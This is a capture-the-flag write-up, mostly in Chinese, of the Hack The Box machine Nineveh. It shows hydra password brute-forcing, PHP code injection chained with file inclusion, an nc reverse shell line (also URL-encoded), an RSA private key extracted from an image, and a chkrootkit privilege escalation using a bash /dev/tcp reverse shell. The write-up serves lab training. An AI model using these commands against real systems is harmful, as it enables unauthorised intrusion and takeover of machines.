kali 10.10.16.5

靶机 10.10.10.43

[[HTB\] Nineveh Writeup. This is a write-up of Nineveh on Hack… | by Richard Marks | System Weakness](https://systemweakness.com/htb-nineveh-writeup-8cf43e5a605d)

[HTB-靶机-Nineveh - 皇帽讲绿帽带法技巧 - 博客园 (cnblogs.com)](https://www.cnblogs.com/autopwn/p/13985366.html)



```bash
└─# nmap -p$ports -sV -sC -O $ip -oN nmap.txt
```

```
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
```



```bash
└─# wget https://10.10.10.43/ninevehForAll.png --no-check-certificate
└─# strings ninevehForAll.png | head -n 10
IHDR
sBIT
tEXtSoftware
Shutterc
IDATx
4! @ (
GVVex
^^Tg
r0eqQ
*CDD
```

```bash
└─# cat keyword.list 
Nineveh
nineveh
ninevehForAll
nineveh
IHDR
sBIT
tEXtSoftware
Shutterc
IDATx
```



443：

```bash
└─# gobuster dir -u https://10.10.10.43/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -k
```

```
/db
```

<img src=".\图片\Snipaste_2023-09-07_09-04-20.png" alt="Snipaste_2023-09-07_09-04-20" style="zoom:80%;" />



```bash
└─# searchsploit phpliteadmin
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
phpLiteAdmin - 'table' SQL Injection                                                                                            | php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities                                                                                     | php/webapps/37515.txt
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                                                                  | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                                                                   | php/webapps/39714.txt
```



```bash
hydra -l admin -P /usr/share/seclists/Passwords/probable-v2-top12000.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64
```

```bash
└─# hydra -l admin -P keyword.list 10.10.10.43 https-post-form  "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64 -I
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-06 21:18:33
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1/p:10), ~1 try per task
[DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect
[443][http-post-form] host: 10.10.10.43   login: admin   password: password123
```

password123 弱口令登录



漏洞利用

[PHPLiteAdmin 1.9.3 - Remote PHP Code Injection - PHP webapps Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/24044)

常规写shell，路径是 /var/tmp/ele.php ，得找文件包含一起利用

<img src=".\图片\Snipaste_2023-09-07_09-52-22.png" alt="Snipaste_2023-09-07_09-52-22" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-09-07_10-20-01.png" alt="Snipaste_2023-09-07_10-20-01" style="zoom: 80%;" />



80：

```bash
└─# gobuster dir -u http://10.10.10.43/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

```bash
/department           (Status: 301) [Size: 315] [--> http://10.10.10.43/department/]
```

<img src=".\图片\Snipaste_2023-09-07_09-56-29.png" alt="Snipaste_2023-09-07_09-56-29" style="zoom:80%;" />

```bash
hydra -l admin -P /usr/share/seclists/Passwords/probable-v2-top12000.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid" -t 64 -I
```

```bash
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
```

弱口令登录，寻找到了 文件包含

```http
10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd
```

<img src=".\图片\Snipaste_2023-09-07_10-06-01.png" alt="Snipaste_2023-09-07_10-06-01" style="zoom:80%;" />



综合利用，webshell+文件包含

注意，经过尝试，路径得有 ninevehNotes

<img src=".\图片\Snipaste_2023-09-07_10-18-15.png" alt="Snipaste_2023-09-07_10-18-15" style="zoom:80%;" />





反弹shell

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 443 >/tmp/f
```

```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.5%20443%20%3E%2Ftmp%2Ff
```



```bash
└─# nc -lvnp 443                                                
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.43] 55518
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```



提权：

```bash
www-data@nineveh:/var/www/ssl$ ls
ls
db  index.html	ninevehForAll.png  secure_notes
```

```bash
└─# wget https://10.10.10.43/secure_notes/nineveh.png --no-check-certificate      
└─# strings nineveh.png
```

得到 了 amrois 用户的私钥

```bash
secret/
0000755
0000041
0000041
00000000000
13126060277
012377
ustar  
www-data
www-data
secret/nineveh.priv
0000600
0000041
0000041
00000003213
13126045656
014730
ustar  
www-data
www-data
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
secret/nineveh.pub
0000644
0000041
0000041
00000000620
13126060277
014541
ustar  
www-data
www-data
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
```

对应验证 amrois 家目录 .ssh

```bash
www-data@nineveh:/home/amrois$ ls -al
ls -al
total 32
drwxr-xr-x 4 amrois amrois 4096 Dec 17  2020 .
drwxr-xr-x 3 root   root   4096 Jul  2  2017 ..
lrwxrwxrwx 1 root   root      9 Dec 17  2020 .bash_history -> /dev/null
-rw-r--r-- 1 amrois amrois  220 Jul  2  2017 .bash_logout
-rw-r--r-- 1 amrois amrois 3765 Jul  2  2017 .bashrc
drwx------ 2 amrois amrois 4096 Jul  3  2017 .cache
-rw-r--r-- 1 amrois amrois  655 Jul  2  2017 .profile
drwxr-xr-x 2 amrois amrois 4096 Jul  2  2017 .ssh
-rw------- 1 amrois amrois   33 Sep  6 19:31 user.txt
www-data@nineveh:/home/amrois$ cd .ssh
cd .ssh
www-data@nineveh:/home/amrois/.ssh$ ls -al
ls -al
total 12
drwxr-xr-x 2 amrois amrois 4096 Jul  2  2017 .
drwxr-xr-x 4 amrois amrois 4096 Dec 17  2020 ..
-rw------- 1 amrois amrois  400 Jul  2  2017 authorized_keys
```



但是22端口开了，不对外开放，这时候要使用 knock ，具体要寻找到相关敲门的信息

```bash
www-data@nineveh:/home/amrois/.ssh$ cat /etc/knockd.conf
cat /etc/knockd.conf
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```

敲门

```bash
└─# knock 10.10.10.43 571  290  911                                                                                                                         127 ⨯
                                                                                                                                                                  
┌──(root💀kali)-[~/Nineveh]
└─# nmap -p22 -sS 10.10.10.43                
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-06 22:55 EDT
Nmap scan report for 10.10.10.43 (10.10.10.43)
Host is up (0.55s latency).

PORT   STATE SERVICE
22/tcp open  ssh
```



```bash
└─# chmod 0400 id_rsa
└─# ssh -i id_rsa amrois@10.10.10.43
```

```bash
amrois@nineveh:~$ id
uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
amrois@nineveh:~$ cd
amrois@nineveh:~$ ls
user.txt
amrois@nineveh:~$ cat user.txt
cbf0ee93f9148f6a4b083258cbc26750
```



使用 pspy 枚举下当前运行的进程相关信息，下载地址：https://github.com/DominicBreuker/pspy/blob/master/README.md ，得出来目标靶机运行了chkrootkit

chkrootkit 本地提取漏洞之前 vulnhub 里复现过

`chkrootkit` 有一个本地提权漏洞，https://www.exploit-db.com/exploits/38775 不管是啥版本，先利用一把试试 ，看了提权代码，最终是要做的就是此程序会以 root 身份周期性执行 /tmp/update 的文件，所以我们只需要新建 tmp 目录下的 update 文件，里面写入反弹shell 代码即可



```bash
amrois@nineveh:~$ cd /tmp
amrois@nineveh:/tmp$ vi update
amrois@nineveh:/tmp$ cat update
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.5/6666 0>&1
amrois@nineveh:/tmp$ chmod +x update
```

```bash
└─# nc -lvnp 6666                                                                                                                                           127 ⨯
listening on [any] 6666 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.43] 50638
bash: cannot set terminal process group (23338): Inappropriate ioctl for device
bash: no job control in this shell
root@nineveh:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@nineveh:~# cat /root/root.txt
cat /root/root.txt
25f889f5e5642bbd75d912750ff155fe
```
